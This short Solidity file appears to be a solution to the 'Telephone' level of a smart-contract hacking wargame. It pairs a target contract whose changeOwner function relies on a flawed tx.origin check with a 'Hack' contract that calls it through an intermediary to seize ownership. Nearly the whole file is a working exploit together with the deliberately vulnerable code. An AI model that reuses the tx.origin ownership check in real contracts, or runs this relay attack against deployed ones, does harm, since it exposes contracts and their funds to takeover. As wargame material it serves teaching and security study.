// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    Telephone private tg ;
    address public owner;
    constructor(address _add){
        tg = Telephone(_add);
        owner = msg.sender;
    }
    function change() public {
        tg.changeOwner(owner);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}